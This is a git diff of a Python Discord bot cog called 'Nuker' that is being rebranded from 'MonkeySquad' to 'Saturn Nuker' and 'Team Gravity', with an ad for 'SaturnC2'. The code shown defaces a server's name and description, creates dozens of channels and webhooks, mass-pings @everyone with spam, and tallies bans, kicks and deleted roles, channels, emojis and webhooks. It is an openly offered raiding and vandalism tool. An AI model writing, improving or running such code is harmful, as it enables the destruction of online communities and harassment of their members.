@@ -8,19 +8,7 @@ import ctypes
 import json
 
 
-server =  0
-banned = 0
-kicked = 0
-messages =  0
-chs = 0
-rls = 0
-roles = 0
-channels = 0
-categories = 0
-emojis = 0
-webhooks = 0
-
-        
+      
 class Nuker(commands.Cog):
    def __init__(self, bot):
       self.bot = bot
@@ -30,7 +18,7 @@ class Nuker(commands.Cog):
    
    @tasks.loop(seconds=5.0)
    async def task(self):      
-      text = f"Discord Nuker || Version: 1.0.0 || Targeted Server: {server} || Banned: {banned} || Kicked: {kicked} || Messages Sent: {messages} || Channels Created: {chs} || Roles Created: {rls} || Cleared Roles: {roles} ||  Cleared Channels: {channels + categories} || Cleared Emojis: {emojis} || Cleared Webhooks: {webhooks} ||"
+      text = f"Saturn Nuker || Version: 1.2.0 || Targeted Server: {server} || Banned: {banned} || Kicked: {kicked} || Messages Sent: {messages} || Channels Created: {chs} || Roles Created: {rls} || Cleared Roles: {roles} ||  Cleared Channels: {channels + categories} || Cleared Emojis: {emojis} || Cleared Webhooks: {webhooks} ||"
       ctypes.windll.kernel32.SetConsoleTitleW(text)
       
       
@@ -65,9 +53,9 @@ class Nuker(commands.Cog):
    async def nukeserver(self, interaction: disnake.ApplicationCommandInteraction):
       guild = interaction.guild
       await guild.edit(
-         reason="MonkeySquad Owns You",
-         name="MonkeySquad Owns You", 
-         description="MonkeySquad Owns You", 
+         reason="Gravity Owns You",
+         name="Buy SaturnC2", 
+         description="Team Gravity Owns You", 
          icon=None, 
          banner=None, 
          splash=None, 
@@ -193,7 +181,7 @@ class Nuker(commands.Cog):
          for _ in range (0, 50):
             try:
                ch = interaction.guild.create_text_channel(name="Saturn Owns You")
-               hook = await ch.create_webhook(name="MonkeySquad Owns You", reason="MonkeySquad Owns You")
+               hook = await ch.create_webhook(name="Team Gravity", reason="Saturn Kills Skids")
                for _ in range(0,20):
                   await hook.send(arg + interaction.guild.default_role)
                   global messages
@@ -202,10 +190,9 @@ class Nuker(commands.Cog):
                pass
       else:
          for channel in interaction.guild.channels:
-            hook = await channel.create_webhook(name="MonkeySquad Owns You", reason="MonkeySquad Owns You")
+            hook = await channel.create_webhook(name="Saturn Owns You", reason="Saturn Kills Skids")
             for _ in range(0, 20):
                await hook.send(f"{arg}\n{interaction.guild.default_role}")
-               global messages
                messages += 1
       
    
@@ -239,6 +226,18 @@ class Nuker(commands.Cog):
          await interaction.guild.create_text_channel(name=arg)
          global chs
          chs += 1
+           
+server =  0
+banned = 0
+kicked = 0
+messages =  0
+chs = 0
+rls = 0
+roles = 0
+channels = 0
+categories = 0
+emojis = 0
+webhooks = 0
       
 def setup(bot):
    bot.add_cog(Nuker(bot))
